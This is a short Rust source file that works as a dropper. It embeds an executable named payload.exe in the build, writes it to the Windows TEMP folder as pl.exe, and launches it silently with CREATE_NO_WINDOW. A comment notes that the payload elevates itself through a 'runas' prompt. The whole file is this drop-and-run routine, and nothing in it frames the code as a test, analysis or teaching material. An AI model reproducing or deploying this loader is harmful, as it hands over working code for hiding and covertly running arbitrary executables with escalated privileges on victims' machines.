use std::path::PathBuf;
use std::process::Command;

const PAYLOAD_BYTES: &[u8] = include_bytes!("../payload.exe");

/// Write the embedded EXE to %TEMP% and launch it (EXE self-elevates via ShellExecute runas).
pub fn deploy_and_launch() -> Result<(), String> {
    let tmp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
    let path = PathBuf::from(&tmp).join("pl.exe");

    std::fs::write(&path, PAYLOAD_BYTES)
        .map_err(|e| format!("write failed: {e}"))?;

    let mut cmd = Command::new(&path);
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
    }
    cmd.spawn().map_err(|e| format!("spawn failed: {e}"))?;
    Ok(())
}
